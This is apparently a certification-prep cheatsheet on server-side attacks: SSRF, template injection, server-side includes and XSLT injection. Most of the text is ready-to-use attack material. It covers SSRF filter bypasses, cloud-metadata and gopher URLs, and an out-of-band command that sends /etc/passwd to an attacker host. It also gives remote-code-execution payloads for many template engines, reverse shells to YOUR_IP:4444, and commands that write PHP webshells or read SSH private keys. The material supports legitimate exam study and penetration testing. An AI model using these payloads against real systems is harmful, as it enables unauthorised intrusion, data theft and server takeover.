---
title: "CWES Cheatsheet — Server-Side Attacks"
date: 2026-03-09
categories: [Certifications, CWES]
tags: [cwes, cheatsheet, ssrf, ssti, server-side-attacks]
excerpt: "SSRF, SSTI, SSI, and XSLT — detection and exploitation for each server-side attack vector."
---

{% raw %}
server-side attacks target the server's own processing logic. SSRF, SSTI, SSI, and XSLT are all different flavours -- each with its own detection and exploitation path.

---

## SSRF (Server-Side Request Forgery)

you make the SERVER send requests on your behalf. the server trusts itself (127.0.0.1), so you can access internal services, read files, and bypass firewalls that block YOUR IP but not the server's.

### how SSRF works

```
Normal:
  You -> request -> Server -> response -> You

SSRF:
  You -> "hey server, fetch http://127.0.0.1:3306 for me" -> Server fetches it
  -> Server returns the internal response to you

Why dangerous:
  - Server can access internal services you can't reach
  - Server trusts localhost (127.0.0.1) -> bypasses firewalls
  - Server can read local files via file://
  - Server can hit cloud metadata (AWS keys, etc.)
```

### URL schemes used in SSRF

| Scheme | What It Does | Example |
|---|---|---|
| `http://` / `https://` | Fetch content via HTTP | `http://127.0.0.1:8080/admin` |
| `file://` | Read local files (LFI) | `file:///etc/passwd` |
| `gopher://` | Send arbitrary bytes to any TCP port | `gopher://127.0.0.1:25/...` (SMTP) |
| `dict://` | Interact with DICT services | `dict://127.0.0.1:6379/INFO` (Redis) |
| `ftp://` | Interact with FTP | `ftp://127.0.0.1/` |

> if the web application relies on a user-supplied URL scheme or protocol, an attacker might be able to cause even further undesired behavior by manipulating the URL scheme. `http://` and `https://` can bypass WAFs, access restricted endpoints, or access endpoints in the internal network. `file://` reads local files. `gopher://` can send arbitrary bytes to the specified address, including HTTP POST requests with arbitrary payloads or communicate with other services like SMTP servers or databases.
{: .prompt-info }

### step 1: find SSRF

```
Look for:
- URL parameters: ?url=, ?page=, ?link=, ?redirect=, ?fetch=, ?dest=
- POST body parameters containing URLs
- Headers: Referer, X-Forwarded-For, Host
- Any functionality that fetches external resources:
  - "Import from URL"
  - "Load profile picture from URL"
  - "Preview URL"
  - "Webhook URL"
  - "PDF generator" (fetches URLs to render)
  - "Check availability" (fetches from another server)
```

### step 2: confirm SSRF

```bash
# Step 1: Start listener on your Kali
nc -lnvp 8000

# Step 2: Supply YOUR URL to the vulnerable parameter
POST /index.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

dateserver=http://YOUR_IP:8000/ssrf&date=2024-01-01

# Step 3: Check your listener -- if you see a connection, SSRF confirmed:
# connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 38782
# GET /ssrf HTTP/1.1
```

**check if response is reflected (non-blind):**

```bash
# Point the server to itself
POST /index.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

dateserver=http://127.0.0.1/index.php&date=2024-01-01

# If response contains the web app's HTML -> non-blind SSRF (best case!)
# If response just says "date unavailable" -> blind SSRF
```

### step 3: internal port scan via SSRF

use SSRF to discover internal services running on the server.

```bash
# Generate port list
seq 1 10000 > ports.txt

# Fuzz ports -- filter out "Failed to connect" (closed ports)
ffuf -w ./ports.txt -u http://TARGET/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" \
  -fr "Failed to connect to"
```

**example output:**

```
[Status: 200, Size: 45, Words: 7]     * FUZZ: 3306    <- MySQL
[Status: 200, Size: 285, Words: 251]  * FUZZ: 80      <- Web server
[Status: 200, Size: 120, Words: 15]   * FUZZ: 6379    <- Redis
[Status: 200, Size: 80, Words: 10]    * FUZZ: 25      <- SMTP
```

> if the web server ran other internal services, such as internal web applications, we could also identify and access them through the SSRF vulnerability.
{: .prompt-info }

### step 4: access restricted internal endpoints

internal services often block external access but trust requests from localhost.

```bash
# Access internal admin panel
dateserver=http://127.0.0.1/admin.php

# Access internal service on different port
dateserver=http://127.0.0.1:8080/

# Access by internal hostname
dateserver=http://dateserver.htb/admin.php
dateserver=http://internal-api.htb/
```

**fuzz for hidden internal endpoints:**

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
  -u http://TARGET/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" \
  -fr "Server at dateserver.htb Port 80"
```

### step 5: read local files (LFI via SSRF)

```bash
# Use file:// scheme
dateserver=file:///etc/passwd
dateserver=file:///etc/hosts
dateserver=file:///var/www/html/config.php
dateserver=file:///home/user/.ssh/id_rsa
```

### step 6: SSRF to internal POST requests (gopher://)

with `http://` you can only send GET requests. use `gopher://` to send POST requests to internal services.

**scenario:** internal `/admin.php` has a login form requiring POST request

**step 1: build the POST request:**

```
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

**step 2: convert to gopher URL (URL-encode spaces and newlines):**

```
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

**step 3: URL-encode the ENTIRE gopher URL again (because it's inside a POST parameter):**

```
dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin
```

> since we are sending our URL within an HTTP POST parameter, which itself is URL-encoded, we need to URL-encode the entire URL again to ensure the correct format after the web server accepts it. otherwise, we will get a `Malformed URL` error.
{: .prompt-info }

**use Gopherus tool to generate gopher URLs automatically:**

```bash
# Install
git clone https://github.com/tarunkant/Gopherus.git

# Generate gopher URL for different services
python2.7 gopherus.py --exploit mysql
python2.7 gopherus.py --exploit smtp
python2.7 gopherus.py --exploit redis
python2.7 gopherus.py --exploit fastcgi
python2.7 gopherus.py --exploit postgresql
```

**supported services:**

```
MySQL, PostgreSQL, FastCGI, Redis, SMTP,
Zabbix, pymemcache, rbmemcache, phpmemcache, dmpmemcache
```

### common SSRF payloads

```bash
# Localhost variations
http://127.0.0.1/
http://localhost/
http://0.0.0.0/
http://[::1]/                    # IPv6 localhost
http://0177.0.0.1/               # Octal
http://2130706433/                # Decimal
http://0x7f000001/                # Hex
http://127.1/                     # Short form
http://127.0.0.1.nip.io/         # DNS rebinding

# Cloud metadata
http://169.254.169.254/latest/meta-data/              # AWS
http://169.254.169.254/metadata/v1/                    # DigitalOcean
http://metadata.google.internal/computeMetadata/v1/    # GCP
http://169.254.169.254/metadata/instance               # Azure

# Internal network scan
http://10.0.0.1/
http://172.16.0.1/
http://192.168.1.1/

# File read
file:///etc/passwd
file:///etc/hosts
file:///var/www/html/config.php
```

### SSRF filter bypass

```bash
# If 127.0.0.1 is blocked:
http://localhost/
http://0.0.0.0/
http://[::1]/
http://0177.0.0.1/          # Octal
http://2130706433/           # Decimal
http://0x7f000001/           # Hex
http://127.1/
http://127.0.0.1.nip.io/

# If "localhost" is blocked:
http://localtest.me/          # Resolves to 127.0.0.1
http://spoofed.burpcollaborator.net/

# If http:// is blocked:
file:///etc/passwd
gopher://127.0.0.1:80/...

# URL encoding
http://%31%32%37%2e%30%2e%30%2e%31/

# Double encoding
http://%2531%2532%2537%252e%2530%252e%2530%252e%2531/

# Redirect bypass (host your own redirect)
# On your server: redirect.php -> header("Location: http://127.0.0.1/admin");
http://YOUR_IP/redirect.php
```

---

## blind SSRF

server processes the URL but does NOT show you the response. much more limited but still useful.

**identifying blind SSRF:**

```bash
# Same confirmation method -- listen for connection
nc -lnvp 8000

# Supply your URL
dateserver=http://YOUR_IP:8000/test

# If you see connection on your listener -> blind SSRF confirmed
# But the response content is NOT reflected back to you
```

### exploiting blind SSRF

**port scan (if error messages differ for open vs closed):**

```bash
# Closed port -> "Something went wrong!"
# Open port with HTTP -> different error message
# Open port without HTTP (like MySQL) -> may not detect

ffuf -w ./ports.txt -u http://TARGET/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" \
  -fr "Something went wrong"
```

> depending on how the web application catches unexpected errors, we might be unable to identify running services that do not respond with valid HTTP responses. for instance, we are unable to identify the running MySQL service using this technique.
{: .prompt-info }

**file enumeration (if error messages differ for existing vs non-existing files):**

```bash
# Existing file -> one error message
# Non-existing file -> different error message

# Fuzz for files
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
  -u http://TARGET/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "dateserver=file:///FUZZ&date=2024-01-01" \
  -fr "No such file"
```

> while we cannot use blind SSRF vulnerabilities to directly exfiltrate data, we can employ the discussed techniques to enumerate open ports in the local network or enumerate existing files on the filesystem. this may reveal information about the underlying system architecture that can help prepare subsequent attacks.
{: .prompt-info }

**out-of-band data exfiltration (if you can trigger DNS or HTTP):**

```bash
# Start listener
python3 -m http.server 8000

# Trigger SSRF to send data to you
dateserver=http://YOUR_IP:8000/?data=$(cat+/etc/passwd)

# Or use Burp Collaborator / webhook.site to detect blind hits
```

---

## SSTI (Server-Side Template Injection)

web apps use template engines (Jinja, Twig, etc.) to generate dynamic HTML. if your input goes into the TEMPLATE itself (not just the data), you can inject template code that the server executes -- leading to file read and RCE.

### how templates work

```python
# SAFE -- user input is passed as DATA (value)
render("Hello {{ name }}!", name=user_input)
# user_input = "{{7*7}}" -> displays "{{7*7}}" as text (not executed)

# VULNERABLE -- user input is part of the TEMPLATE
render("Hello " + user_input + "!")
# user_input = "{{7*7}}" -> template becomes "Hello {{7*7}}!"
# Template engine executes it -> displays "Hello 49!"
```

> SSTI occurs when user input is inserted into the template BEFORE the rendering function is called. template engines handle user input securely if it is provided as values to the rendering function. SSTI occurs when an attacker can control the template parameter itself.
{: .prompt-info }

### step 1: confirm SSTI

**inject the universal test string:**

```
${{<%[%'"}}%\.
```

> this test string consists of all special characters that have a particular semantic purpose in popular template engines. since it should almost certainly violate the template syntax, it should result in an error if the web application is vulnerable to SSTI. this is similar to how injecting a single quote (`'`) can break SQL syntax.
{: .prompt-info }

```
If you see an error -> SSTI likely -> proceed to Step 2
If input is displayed as-is -> probably not vulnerable
```

**then try math expressions:**

```
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
```

```
If you see 49 -> SSTI confirmed
If you see {{7*7}} as text -> not vulnerable
```

### step 2: identify the template engine

we need to identify the template engine the target web application uses, as the exploitation process highly depends on the concrete template engine in use. each template engine uses a slightly different syntax and supports different functions we can use for exploitation.

**quick identification payloads:**

| Payload | Engine (if it works) |
|---|---|
| `{{7*7}}` = 49 | Jinja2 or Twig |
| `{{7*'7'}}` = 7777777 | Jinja2 (Python) |
| `{{7*'7'}}` = 49 | Twig (PHP) |
| `${7*7}` = 49 | Mako, FreeMarker |
| `<%= 7*7 %>` = 49 | ERB (Ruby) |
| `#{7*7}` = 49 | Pug/Jade (Node.js) |
| `{{config}}` shows config | Jinja2 (Flask) |
| `{{_self}}` shows template info | Twig |

### step 3: exploit -- Jinja2 (Python/Flask)

**information disclosure:**

```python
# Dump Flask config (contains SECRET_KEY, DB creds, etc.)
{{ config }}
{{ config.items() }}

# Get current app
{{ request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__init__.__globals__ }}
```

**read files (LFI):**

```python
# Method 1: Direct file read
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}

# Method 2: Using cycler (more reliable)
{{ cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}

# Method 3: Using request
{{ request.__class__._load_form_data.__globals__.__builtins__.open('/etc/passwd').read() }}
```

**remote code execution:**

```python
# Method 1: os.popen (most common)
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('whoami').read() }}
{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}

# Method 2: subprocess
{{ ''.__class__.__mro__[1].__subclasses__()[407]('id', shell=True, stdout=-1).communicate()[0] }}

# Method 3: Classic MRO chain
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

# Method 4: import os
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Method 5: config
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

**reverse shell:**

```python
{{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"').read() }}
```

> if one payload doesn't work, try another method. the subclass index number (e.g., `[407]`) changes between Python versions -- you may need to enumerate subclasses first.
{: .prompt-tip }

```python
# List all subclasses to find the right index
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

### step 3: exploit -- Twig (PHP)

**information disclosure:**

```
{{ _self }}
```

> in Twig, we can use the `_self` keyword to obtain a little information about the current template. however, the amount of information is limited compared to Jinja.
{: .prompt-info }

**read files (LFI):**

```
# Using Symfony's file_excerpt filter
{{ "/etc/passwd"|file_excerpt(1,-1) }}
{{ "/flag.txt"|file_excerpt(1,-1) }}
{{ "/var/www/html/config.php"|file_excerpt(1,-1) }}
```

> reading local files using internal functions directly provided by Twig is not possible. however, the PHP web framework Symfony defines additional Twig filters. one of these filters is `file_excerpt` and can be used to read local files.
{: .prompt-info }

**remote code execution:**

```
# Method 1: filter function (most reliable)
{{ ['id'] | filter('system') }}
{{ ['whoami'] | filter('system') }}
{{ ['cat /flag.txt'] | filter('system') }}
{{ ['cat /etc/passwd'] | filter('system') }}

# Method 2: map function
{{ ['id'] | map('system') | join }}

# Method 3: reduce function
{{ [0] | reduce('system', 'id') }}

# Method 4: sort function
{{ ['id', ''] | sort('system') }}
```

**reverse shell:**

```
{{ ['bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"'] | filter('system') }}
```

### step 3: exploit -- other engines

**Mako (Python):**

```python
${__import__('os').popen('id').read()}
```

**ERB (Ruby):**

```ruby
<%= system('id') %>
<%= `cat /etc/passwd` %>
<%= File.open('/etc/passwd').read %>
```

**FreeMarker (Java):**

```java
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

**Pug/Jade (Node.js):**

```
#{root.process.mainModule.require('child_process').execSync('id')}
```

**Handlebars (Node.js):**

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### SSTI payloads quick reference

| Engine | Language | Detect | RCE |
|---|---|---|---|
| Jinja2 | Python | `{{7*'7'}}` = 7777777 | `{{ cycler.__init__.__globals__.os.popen('id').read() }}` |
| Twig | PHP | `{{7*'7'}}` = 49 | `{{ ['id'] \| filter('system') }}` |
| Mako | Python | `${7*7}` = 49 | `${__import__('os').popen('id').read()}` |
| ERB | Ruby | `<%= 7*7 %>` = 49 | `<%= system('id') %>` |
| FreeMarker | Java | `${7*7}` = 49 | `${"freemarker.template.utility.Execute"?new()("id")}` |
| Pug | Node.js | `#{7*7}` = 49 | `#{root.process.mainModule.require('child_process').execSync('id')}` |

> the general idea behind SSTI exploitation remains the same across all engines. exploiting SSTI in an unfamiliar template engine is often as simple as becoming familiar with the syntax and supported features. an attacker can achieve this by reading the documentation or using [PayloadsAllTheThings SSTI CheatSheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection).
{: .prompt-info }

### SSTI filter bypass

```python
# If {{ }} is blocked, try:
{% print(7*7) %}
{%- print(7*7) -%}

# If "config" is blocked:
{{ self.__dict__ }}
{{ request.environ }}

# If underscores __ are blocked:
{{ request|attr('application') }}
{{ request['__class__'] }}

# If dots are blocked:
{{ request|attr('application') }}
{{ request['__class__']['__mro__'] }}

# If quotes are blocked:
{% set c = char(95) %}  {# underscore #}

# URL encode the payload
%7B%7B7*7%7D%7D
```

---

## SSI (Server-Side Includes) Injection

SSI is a technology that lets web servers add dynamic content to HTML pages using special directives (comments). if your input gets inserted into an SSI-processed page without sanitization, you can inject directives to read files, execute commands, and take control of the server.

### how SSI works

```html
<!-- Normal HTML comment (ignored by server) -->
<!-- This is just a comment -->

<!-- SSI directive (EXECUTED by server) -->
<!--#echo var="DATE_LOCAL" -->
```

> SSI is supported by many popular web servers such as Apache and IIS. the use of SSI can often be inferred from the file extension. typical file extensions include `.shtml`, `.shtm`, and `.stm`. however, web servers can be configured to support SSI directives in arbitrary file extensions.
{: .prompt-info }

### SSI directive syntax

```
<!--#name param1="value1" param2="value2" -->
```

### all SSI directives

| Directive | What It Does | Payload |
|---|---|---|
| `printenv` | Print ALL environment variables | `<!--#printenv -->` |
| `echo` | Print a specific variable | `<!--#echo var="DOCUMENT_NAME" -->` |
| `exec` | Execute a system command | `<!--#exec cmd="whoami" -->` |
| `include` | Include another file from web root | `<!--#include virtual="index.html" -->` |
| `config` | Change SSI configuration | `<!--#config errmsg="Error!" -->` |

### built-in variables for `echo`

| Variable | What It Shows |
|---|---|
| `DOCUMENT_NAME` | Current filename |
| `DOCUMENT_URI` | Current file URI/path |
| `LAST_MODIFIED` | Last modification timestamp |
| `DATE_LOCAL` | Local server time |
| `SERVER_SOFTWARE` | Web server version |
| `REMOTE_ADDR` | Client IP address |

### step 1: identify SSI

```
Look for:
- File extensions: .shtml, .shtm, .stm
- Pages that display server info (date, file path, etc.)
- Input that gets reflected on a .shtml page
- Forms where your input appears on the next page
```

### step 2: confirm SSI injection

```html
<!-- Inject printenv directive as your input -->
<!--#printenv -->
```

```
If environment variables are printed -> SSI injection confirmed
If <!--#printenv --> is displayed as text -> not vulnerable
```

> if our username is inserted into the page without prior sanitization, it might be vulnerable to SSI injection. we can confirm this by providing a username of `<!--#printenv -->`. if the directive is executed and environment variables are printed, we have successfully confirmed an SSI injection vulnerability.
{: .prompt-info }

### step 3: read information

```html
<!-- Print current filename -->
<!--#echo var="DOCUMENT_NAME" -->

<!-- Print current URI -->
<!--#echo var="DOCUMENT_URI" -->

<!-- Print server software -->
<!--#echo var="SERVER_SOFTWARE" -->

<!-- Print all environment variables at once -->
<!--#printenv -->

<!-- Include another file from web root -->
<!--#include virtual="/index.html" -->
<!--#include virtual="/config.php" -->
<!--#include virtual="/.htaccess" -->
```

### step 4: remote code execution

```html
<!-- Execute commands -->
<!--#exec cmd="id" -->
<!--#exec cmd="whoami" -->
<!--#exec cmd="cat /etc/passwd" -->
<!--#exec cmd="cat /flag.txt" -->
<!--#exec cmd="ls -la /var/www/html/" -->
<!--#exec cmd="uname -a" -->
```

**reverse shell:**

```html
<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'" -->
```

**write a webshell:**

```html
<!--#exec cmd="echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php" -->
```

then access: `http://target.htb/shell.php?cmd=id`

### SSI injection scenarios

| Scenario | How to Exploit |
|---|---|
| Input reflected on `.shtml` page | Inject `<!--#exec cmd="id" -->` as your input |
| File upload allows `.shtml` | Upload file containing SSI directives |
| App writes input to file in webroot | Input `<!--#exec cmd="id" -->` -> gets written to file -> SSI processes it |

**file upload attack:**

```html
<!-- Create evil.shtml with SSI payload -->
<!--#exec cmd="cat /etc/passwd" -->
```

```
1. Save as evil.shtml
2. Upload via file upload functionality
3. Access: http://target.htb/uploads/evil.shtml
4. Server processes SSI directives -> you see /etc/passwd
```

### SSI quick payloads

```html
<!-- Confirm SSI -->
<!--#printenv -->

<!-- Info gathering -->
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="SERVER_SOFTWARE" -->

<!-- Read files -->
<!--#include virtual="/etc/passwd" -->
<!--#exec cmd="cat /etc/passwd" -->
<!--#exec cmd="cat /flag.txt" -->

<!-- RCE -->
<!--#exec cmd="id" -->
<!--#exec cmd="whoami" -->

<!-- Reverse shell -->
<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'" -->
```

---

## XSLT (eXtensible Stylesheet Language Transformations) Injection

XSLT is a language that transforms XML documents into other formats (like HTML). if your input gets inserted into XSLT data before processing, you can inject XSL elements to read files and execute commands.

### how XSLT works

**sample XML document:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<fruits>
    <fruit>
        <name>Apple</name>
        <color>Red</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Banana</name>
        <color>Yellow</color>
    </fruit>
</fruits>
```

**XSLT template that processes the XML:**

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/fruits">
        Here are all the fruits:
        <xsl:for-each select="fruit">
            <xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
        </xsl:for-each>
    </xsl:template>
</xsl:stylesheet>
```

**output:**

```
Here are all the fruits:
    Apple (Red)
    Banana (Yellow)
```

### common XSL elements

| Element | What It Does | Example |
|---|---|---|
| `<xsl:template>` | Defines a template, `match` attribute selects XML path | `<xsl:template match="/fruits">` |
| `<xsl:value-of>` | Extracts value of node in `select` attribute | `<xsl:value-of select="name"/>` |
| `<xsl:for-each>` | Loops over nodes in `select` attribute | `<xsl:for-each select="fruit">` |
| `<xsl:sort>` | Sorts elements in a loop | `<xsl:sort select="color" order="descending"/>` |
| `<xsl:if>` | Tests a condition | `<xsl:if test="size = 'Medium'">` |

> XSLT injection occurs whenever user input is inserted into XSL data before the XSLT processor generates output. this enables an attacker to inject additional XSL elements into the XSL data, which the XSLT processor will execute during the output generation process.
{: .prompt-info }

### step 1: identify XSLT injection

```
Look for:
- Web pages that display XML-structured data (lists, tables)
- Pages where your input appears in formatted output
- Applications that process/transform XML
- XML-based report generators
```

**confirm vulnerability -- inject a broken XML tag and look for a server error.**

> while this does not definitively confirm the presence of an XSLT injection vulnerability, it may indicate the existence of a security issue.
{: .prompt-info }

### step 2: confirm XSLT and gather info

**inject XSLT elements to identify the processor:**

```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

```
If you see version/vendor info -> XSLT injection confirmed
Note the version number -- it determines what functions are available
```

**common XSLT processors:**

| Processor | Language | Notes |
|---|---|---|
| `libxslt` | C (used by PHP) | Supports XSLT 1.0, may support PHP functions |
| `Saxon` | Java | Supports XSLT 2.0 and 3.0 |
| `Xalan` | Java/C++ | Supports XSLT 1.0 |
| `MSXML` | Windows/.NET | Microsoft's XSLT processor |

### step 3: read files (LFI)

**method 1 -- XSLT 2.0+ (unparsed-text function):**

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

> `unparsed-text` was only introduced in XSLT version 2.0. if the processor is version 1.0, this will return an error.
{: .prompt-info }

**method 2 -- PHP function (if XSLT processor supports PHP):**

```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

**files to read:**

```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
<xsl:value-of select="php:function('file_get_contents','/etc/hosts')" />
<xsl:value-of select="php:function('file_get_contents','/var/www/html/config.php')" />
<xsl:value-of select="php:function('file_get_contents','/flag.txt')" />
<xsl:value-of select="php:function('file_get_contents','/home/user/.ssh/id_rsa')" />
```

**method 3 -- document() function (XSLT 1.0):**

```xml
<xsl:value-of select="document('/etc/passwd')" />
```

> only works if the file is valid XML. won't work for most system files.
{: .prompt-info }

### step 4: remote code execution

**PHP function -- system():**

```xml
<xsl:value-of select="php:function('system','id')" />
<xsl:value-of select="php:function('system','whoami')" />
<xsl:value-of select="php:function('system','cat /etc/passwd')" />
<xsl:value-of select="php:function('system','cat /flag.txt')" />
<xsl:value-of select="php:function('system','ls -la')" />
```

> if an XSLT processor supports PHP functions, we can call a PHP function that executes a local system command to obtain RCE.
{: .prompt-info }

**reverse shell:**

```xml
<xsl:value-of select="php:function('system','bash -c &quot;bash -i >& /dev/tcp/YOUR_IP/4444 0>&1&quot;')" />
```

**write a webshell:**

```xml
<xsl:value-of select="php:function('system','echo &lt;?php system($_GET[&quot;cmd&quot;]); ?&gt; > /var/www/html/shell.php')" />
```

> XML special characters (`<`, `>`, `"`) must be escaped as entities (`&lt;`, `&gt;`, `&quot;`) inside XSLT payloads.
{: .prompt-warning }

### XSLT quick payloads

```xml
<!-- Confirm XSLT injection -->
<xsl:value-of select="system-property('xsl:version')" />

<!-- Info gathering -->
<xsl:value-of select="system-property('xsl:vendor')" />
<xsl:value-of select="system-property('xsl:product-name')" />

<!-- Read files (XSLT 2.0+) -->
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />

<!-- Read files (PHP) -->
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />

<!-- RCE (PHP) -->
<xsl:value-of select="php:function('system','id')" />
<xsl:value-of select="php:function('system','cat /flag.txt')" />
```

---

[← Back to CWES Cheatsheet Index](/posts/cwes-cheatsheet/)
{% endraw %}
